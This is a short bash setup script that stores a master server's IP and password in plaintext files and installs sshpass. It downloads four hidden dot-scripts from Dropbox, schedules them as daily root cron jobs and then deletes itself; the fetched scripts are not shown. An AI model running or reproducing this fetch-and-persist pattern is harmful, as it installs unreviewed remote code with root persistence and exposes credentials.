#!/bin/bash

echo -e "Enter Master server IP"
read ip
echo "$ip" > /.ipaddr
echo -e "Enter Master Server Password"
read pass
echo "$pass" > .u.pwd

###################SSHPASS
yum install wget gcc mailx -y

wget http://sourceforge.net/projects/sshpass/files/latest/download -O sshpass.tar.gz
tar -zxvf sshpass.tar.gz
cd sshpass-1.05/
./configure
make
make install

################### File Download
cd /root/

wget https://dl.dropboxusercontent.com/u/17801313/awstats.mail.conf
mv awstats.mail.conf /etc/awstats/awstats.mail.conf

wget https://www.dropbox.com/s/hhsyophytxs9syo/.msnt.sh
wget https://www.dropbox.com/s/p6c13lhmt17k2lu/.minelg.sh
wget https://www.dropbox.com/s/jwlqrc4uwthywv9/.scpp.sh
wget https://www.dropbox.com/s/g2gandyp077uimb/.dfle.sh

chmod 755 .msnt.sh
chmod 755 .minelg.sh
chmod 755 .scpp.sh
chmod 755 .dfle.sh

################## CRON

echo -e "@daily root /root/.minelg.sh

@daily root /root/.msnt.sh

@daily root /root/.scpp.sh

@daily root /root/.dfle.sh" >> /etc/crontab

service crond restart
#######################
rm -rf secipdlv.sh

